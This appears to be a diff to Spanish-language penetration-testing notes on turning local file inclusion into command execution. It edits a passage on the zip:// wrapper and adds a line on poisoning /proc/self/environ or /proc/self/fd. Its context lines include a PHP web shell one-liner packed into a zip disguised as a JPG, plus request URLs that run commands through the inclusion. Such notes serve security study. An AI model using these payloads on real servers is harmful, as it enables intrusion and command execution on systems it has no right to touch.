@@ -69,8 +69,8 @@ http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
 
 
 ################Zip FILES
-podemos también aprovechar también, si se encuentra permitida, la subida de archivos zip:
-
+podemos aprovechar también, si se encuentra permitida, la subida de archivos zip para crear un archivo Zip con 
+extensión JPG:
 echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
 
 http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
@@ -147,7 +147,7 @@ podemos probar esto en otros logs como:
 Dependiendo de a qué tengamos acceso.
 
 
-
+También podemos probar envenenar los proc /proc/self/environ o /proc/self/fd/(N) (N es un número usualmente de 0 a 50)
 
 ################################## Automatización:
 
